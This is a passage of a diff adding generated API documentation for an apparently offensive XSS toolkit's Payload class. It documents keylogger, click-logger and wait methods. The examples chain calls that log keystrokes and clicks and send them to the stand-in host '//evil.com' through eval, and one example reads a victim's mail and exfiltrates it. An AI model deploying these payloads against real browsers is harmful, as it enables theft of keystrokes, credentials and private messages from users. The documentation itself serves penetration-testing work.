+{"comment":"/**\n     * Start a click logger, each click position and targeted element will be exfiltrated via the exfiltrators.<br>\n     * <br>\n     * The pipe value is not modified.\n     * @param {function} [f=null] User defined function to call instead of exfiltrating\n     * @graph $Payload ->  ($current)  -> $Payload\n     * @example\n     * const p = Payload.new()\n     *               .setExfiltrator(exfiltrator.get('//evil.com'))\n     *               .startClickLogger()\n     *\n     * eval(p.run())\n     * @example\n     * const p = Payload.new()\n     *               .setExfiltrator(ev => console.log(ev.target))\n     *               .startClickLogger()\n     *\n     * eval(p.run())\n     * @returns {Payload} The new payload object in the chain.\n     */","meta":{"range":[23973,24330],"filename":"Payload.js","lineno":642,"columnno":4,"path":"/home/bitk/ywh/git/xsstools/src","code":{"id":"astnode100002479","name":"Payload#startClickLogger","type":"MethodDefinition","paramnames":["f"]},"vars":{"":null},"shortpath":"Payload.js"},"description":"<p>Start a click logger, each click position and targeted element will be exfiltrated via the exfiltrators.<br>\n<br>\nThe pipe value is not modified.</p><script type=\"graph\">[{\"readType\":\"\",\"returnType\":\"\",\"html\":\"<a href='./Payload.html'>Payload</a>\"},{\"readType\":null,\"label\":\"startClickLogger(f=null)\",\"children\":null,\"returnType\":null},{\"readType\":\"\",\"returnType\":\"\",\"html\":\"<a href='./Payload.html'>Payload</a>\"}]</script>","params":[{"type":{"names":["function"]},"optional":true,"defaultvalue":null,"description":"<p>User defined function to call instead of exfiltrating</p>","name":"f"}],"graph":[{"readType":"","returnType":"","html":"<a href='./Payload.html'>Payload</a>"},{"readType":null,"label":"startClickLogger(f=null)","children":null,"returnType":null},{"readType":"","returnType":"","html":"<a href='./Payload.html'>Payload</a>"}],"examples":[{"caption":"","code":"const p = Payload.new()\n              .setExfiltrator(exfiltrator.get('//evil.com'))\n              .startClickLogger()\n\neval(p.run())"},{"caption":"","code":"const p = Payload.new()\n              .setExfiltrator(ev => console.log(ev.target))\n              .startClickLogger()\n\neval(p.run())"}],"returns":[{"type":{"names":["Payload"]},"description":"<p>The new payload object in the chain.</p>"}],"name":"startClickLogger","longname":"Payload#startClickLogger","kind":"function","memberof":"Payload","scope":"instance","___id":"T000002R000181","___s":true,"attribs":"<span class=\"type-signature\"></span>","id":"startClickLogger","signature":"<span class=\"signature\">(f<span class=\"signature-attributes\">opt</span>)</span><span class=\"type-signature\"> &rarr; {<a href=\"Payload.html\">Payload</a>}</span>","ancestors":["<a href=\"Payload.html\">Payload</a>#"]}
+</pre>
+-->
+</div>
+
+        
+            <!--method.tmpl-->
+<div class="method-details">
+
+
+
+  <!--source-link.tmpl-->
+
+
+<div class="pull-right source-link-container">
+  <code class="source-link" data-tmpl="method-tmpl(1)">
+    <i class="fa fa-file-o"></i>
+    <a href="Payload.js.html">Payload.js</a>:<a href="Payload.js.html#line614">614</a>
+  </code>
+</div>
+
+
+
+
+    
+
+    
+
+    <h4 class="name" id="startKeyLogger">
+      <a href="#params-startKeyLogger"><span class="type-signature"></span>startKeyLogger</a><span class="signature">(f<span class="signature-attributes">opt</span>)</span><span class="type-signature"> &rarr; {<a href="Payload.html">Payload</a>}</span>
+
+    </h4>
+
+    
+
+
+
+
+
+
+
+
+
+
+
+
+
+<div class="description">
+    <p>Start a key logger, each keystroke will be exfiltrated via the exfiltrators.<br>
+<br>
+The pipe value is not modified.</p><script type="graph">[{"readType":"","returnType":"","html":"<a href='./Payload.html'>Payload</a>"},{"readType":null,"label":"startKeyLogger(f=null)","children":null,"returnType":null},{"readType":"","returnType":"","html":"<a href='./Payload.html'>Payload</a>"}]</script>
+</div>
+
+
+
+
+    <h5>Examples</h5>
+    
+    <pre class="prettyprint"><code>const p = Payload.new()
+              .setExfiltrator(exfiltrator.get('//evil.com'))
+              .startKeyLogger()
+
+eval(p.run())</code></pre>
+
+    <pre class="prettyprint"><code>const p = Payload.new()
+              .setExfiltrator(ev => console.log(ev.target))
+              .startKeyLogger()
+
+eval(p.run())</code></pre>
+
+
+
+
+
+
+<div class="collapse_" id="methodCollapse-startKeyLogger">
+
+  
+
+  
+
+<!-- details.tmpl -->
+
+
+
+
+
+
+
+
+<dl class="dl-horizontal">
+
+    
+
+    
+
+    
+
+    
+
+    
+
+    
+
+    
+
+    
+
+    
+
+    
+
+    
+
+    
+</dl>
+
+
+
+
+
+
+
+
+  <div id="params-startKeyLogger" class="bs-callout bs-callout-primary">
+    <h5>Parameters</h5>
+    <!--params.tmpl-->
+
+
+<table class="table table-bordered">
+    <thead>
+    <tr>
+        
+        <th>Name</th>
+        
+
+        <th>Type</th>
+
+        
+        <th>Attributes</th>
+        
+
+        
+        <th>Default</th>
+        
+
+        <th class="last">Description</th>
+    </tr>
+    </thead>
+
+    <tbody>
+    
+
+        <tr>
+            
+                <td class="name"><code>f</code></td>
+            
+
+            <td class="type">
+            
+                
+<span class="param-type">function</span>
+
+
+            
+            </td>
+
+            
+                <td class="attributes">
+                
+                    &lt;optional><br>
+                
+
+                
+
+                
+                </td>
+            
+
+            
+                <td class="default">
+                
+                    null
+                
+                </td>
+            
+
+            <td class="description last"><p>User defined function to call instead of exfiltrating</p></td>
+        </tr>
+
+    
+    </tbody>
+</table>
+
+  </div>
+
+
+
+
+
+
+
+
+
+
+
+
+
+  <div class="bs-callout bs-callout-success">
+    <h5>Returns </h5>
+
+        
+<div class="param-desc">
+    <p>The new payload object in the chain.</p>
+</div>
+
+
+
+<dl class="param-type">
+    <dt>
+        Type
+    </dt>
+    <dd>
+        
+<span class="param-type"><a href="Payload.html">Payload</a></span>
+
+
+    </dd>
+</dl>
+
+    
+</div>
+  
+
+
+
+
+
+
+</div>
+
+<!--
+<pre>
+{"comment":"/**\n     * Start a key logger, each keystroke will be exfiltrated via the exfiltrators.<br>\n     * <br>\n     * The pipe value is not modified.\n     * @param {function} [f=null] User defined function to call instead of exfiltrating\n     * @graph $Payload ->  ($current)  -> $Payload\n     * @example\n     * const p = Payload.new()\n     *               .setExfiltrator(exfiltrator.get('//evil.com'))\n     *               .startKeyLogger()\n     *\n     * eval(p.run())\n     * @example\n     * const p = Payload.new()\n     *               .setExfiltrator(ev => console.log(ev.target))\n     *               .startKeyLogger()\n     *\n     * eval(p.run())\n     * @returns {Payload} The new payload object in the chain.\n     */","meta":{"range":[22965,23215],"filename":"Payload.js","lineno":614,"columnno":4,"path":"/home/bitk/ywh/git/xsstools/src","code":{"id":"astnode100002430","name":"Payload#startKeyLogger","type":"MethodDefinition","paramnames":["f"]},"vars":{"":null},"shortpath":"Payload.js"},"description":"<p>Start a key logger, each keystroke will be exfiltrated via the exfiltrators.<br>\n<br>\nThe pipe value is not modified.</p><script type=\"graph\">[{\"readType\":\"\",\"returnType\":\"\",\"html\":\"<a href='./Payload.html'>Payload</a>\"},{\"readType\":null,\"label\":\"startKeyLogger(f=null)\",\"children\":null,\"returnType\":null},{\"readType\":\"\",\"returnType\":\"\",\"html\":\"<a href='./Payload.html'>Payload</a>\"}]</script>","params":[{"type":{"names":["function"]},"optional":true,"defaultvalue":null,"description":"<p>User defined function to call instead of exfiltrating</p>","name":"f"}],"graph":[{"readType":"","returnType":"","html":"<a href='./Payload.html'>Payload</a>"},{"readType":null,"label":"startKeyLogger(f=null)","children":null,"returnType":null},{"readType":"","returnType":"","html":"<a href='./Payload.html'>Payload</a>"}],"examples":[{"caption":"","code":"const p = Payload.new()\n              .setExfiltrator(exfiltrator.get('//evil.com'))\n              .startKeyLogger()\n\neval(p.run())"},{"caption":"","code":"const p = Payload.new()\n              .setExfiltrator(ev => console.log(ev.target))\n              .startKeyLogger()\n\neval(p.run())"}],"returns":[{"type":{"names":["Payload"]},"description":"<p>The new payload object in the chain.</p>"}],"name":"startKeyLogger","longname":"Payload#startKeyLogger","kind":"function","memberof":"Payload","scope":"instance","___id":"T000002R000176","___s":true,"attribs":"<span class=\"type-signature\"></span>","id":"startKeyLogger","signature":"<span class=\"signature\">(f<span class=\"signature-attributes\">opt</span>)</span><span class=\"type-signature\"> &rarr; {<a href=\"Payload.html\">Payload</a>}</span>","ancestors":["<a href=\"Payload.html\">Payload</a>#"]}
+</pre>
+-->
+</div>
+
+        
+            <!--method.tmpl-->
+<div class="method-details">
+
+
+
+  <!--source-link.tmpl-->
+
+
+<div class="pull-right source-link-container">
+  <code class="source-link" data-tmpl="method-tmpl(1)">
+    <i class="fa fa-file-o"></i>
+    <a href="Payload.js.html">Payload.js</a>:<a href="Payload.js.html#line292">292</a>
+  </code>
+</div>
+
+
+
+
+    
+
+    
+
+    <h4 class="name" id="wait">
+      <a href="#params-wait"><span class="type-signature"></span>wait</a><span class="signature">(ms)</span><span class="type-signature"> &rarr; {<a href="Payload.html">Payload</a>}</span>
+
+    </h4>
+
+    
+
+
+
+
+
+
+
+
+
+
+
+
+
+<div class="description">
+    <p>Wait before contiuing the execution.</p><script type="graph">[{"readType":"","returnType":"","html":"<a href='./Payload.html'>Payload</a>"},{"readType":"int","label":"wait(ms)","children":null,"returnType":null},{"readType":"","returnType":"","html":"<a href='./Payload.html'>Payload</a>"}]</script>
+</div>
+
+
+
+
+    <h5>Example</h5>
+    
+    <pre class="prettyprint"><code>const p new Payload()
+            .fetch("/sendMail")      # Long operation that continue after the response
+            .wait(4000)              # wait for 4s
+            .fetchText("/readMail")
+            .exfiltrate()
+
+eval(p.run())</code></pre>
+
+
+
+
+
+
+<div class="collapse_" id="methodCollapse-wait">
+
+  
+
+  
+
+<!-- details.tmpl -->
+
+
+
+
+
+
+
+
+<dl class="dl-horizontal">
+
+    
+
+    
+
+    
+
+    
+
+    
+
+    
+
+    
+
+    
+
+    
+
+    
+
+    
+
+    
+</dl>
+
+
+
+
+
+
+
+
+  <div id="params-wait" class="bs-callout bs-callout-primary">
+    <h5>Parameters</h5>
+    <!--params.tmpl-->
+
+
+<table class="table table-bordered">
+    <thead>
+    <tr>
+        
+        <th>Name</th>
+        
+
+        <th>Type</th>
+
+        
+
+        
+        <th>Default</th>
+        
+
+        <th class="last">Description</th>
+    </tr>
+    </thead>
+
+    <tbody>
+    
+
+        <tr>
+            
+                <td class="name"><code>ms</code></td>
+            
+
+            <td class="type">
+            
+                
+<span class="param-type">number</span>
+|
+
+<span class="param-type"><a href="Payload.html">Payload</a></span>
+|
+
+<span class="param-type">function</span>
+
+
+            
+            </td>
+
+            
+
+            
+                <td class="default">
+                
+                    null
+                
+                </td>
+            
+
+            <td class="description last"><p>Time to wait in ms.</p></td>
+        </tr>
+
+    
+    </tbody>
+</table>
+
+  </div>
+
+
+
+
+
+
+
+
+
+
+
+
+
+  <div class="bs-callout bs-callout-success">
+    <h5>Returns </h5>
+
+        
+<div class="param-desc">
+    <p>The new payload object in the chain.</p>
+</div>
+
+
+
+<dl class="param-type">
+    <dt>
+        Type
+    </dt>
+    <dd>
+        
+<span class="param-type"><a href="Payload.html">Payload</a></span>
+
+
+    </dd>
+</dl>
+
+    
+</div>
+  
+
+
+
+
+
+
+</div>
+
+<!--
+<pre>
+{"comment":"/**\n    * Wait before contiuing the execution.\n    * @graph $Payload -> {int} ($current) -> $Payload\n    * @param {number|Payload|function} ms Time to wait in ms.\n    * @example\n    * const p new Payload()\n    *             .fetch(\"/sendMail\")      # Long operation that continue after the response\n    *             .wait(4000)              # wait for 4s\n    *             .fetchText(\"/readMail\")\n    *             .exfiltrate()\n    *\n    * eval(p.run())\n     * @returns {Payload} The new payload object in the chain.\n     */","meta":{"range":[10277,10710],"filename":"Payload.js","lineno":292,"columnno":4,"path":"/home/bitk/ywh/git/xsstools/src","code":{"id":"astnode100001785","name":"Payload#wait","type":"MethodDefinition","paramnames":["ms"]},"vars":{"":null},"shortpath":"Payload.js"},"description":"<p>Wait before contiuing the execution.</p><script type=\"graph\">[{\"readType\":\"\",\"returnType\":\"\",\"html\":\"<a href='./Payload.html'>Payload</a>\"},{\"readType\":\"int\",\"label\":\"wait(ms)\",\"children\":null,\"returnType\":null},{\"readType\":\"\",\"returnType\":\"\",\"html\":\"<a href='./Payload.html'>Payload</a>\"}]</script>","graph":[{"readType":"","returnType":"","html":"<a href='./Payload.html'>Payload</a>"},{"readType":"int","label":"wait(ms)","children":null,"returnType":null},{"readType":"","returnType":"","html":"<a href='./Payload.html'>Payload</a>"}],"params":[{"type":{"names":["number","Payload","function"]},"description":"<p>Time to wait in ms.</p>","name":"ms","defaultvalue":null}],"examples":[{"caption":"","code":"const p new Payload()\n            .fetch(\"/sendMail\")      # Long operation that continue after the response\n            .wait(4000)              # wait for 4s\n            .fetchText(\"/readMail\")\n            .exfiltrate()\n\neval(p.run())"}],"returns":[{"type":{"names":["Payload"]},"description":"<p>The new payload object in the chain.</p>"}],"name":"wait","longname":"Payload#wait","kind":"function","memberof":"Payload","scope":"instance","___id":"T000002R000154","___s":true,"attribs":"<span class=\"type-signature\"></span>","id":"wait","signature":"<span class=\"signature\">(ms)</span><span class=\"type-signature\"> &rarr; {<a href=\"Payload.html\">Payload</a>}</span>","ancestors":["<a href=\"Payload.html\">Payload</a>#"]}
+</pre>
+-->
+</div>
+
+        
+    
+
+    
+
+    
+</article>
+
+</section>
+
+
+
+
+</div>
+
+<br class="clear">
+
+<footer>
+    Documentation generated by <a href="https://github.com/jsdoc3/jsdoc">JSDoc 3.6.6</a> on Sun Mar 14 2021 13:45:10 GMT+0100 (Central European Standard Time) using the LOKE theme.
+</footer>
+
+<script>prettyPrint();</script>
+<script src="scripts/linenumber.js"></script>
+<script>window.addEventListener("DOMContentLoaded", initGraphs)</script>
+</body>
+</html>
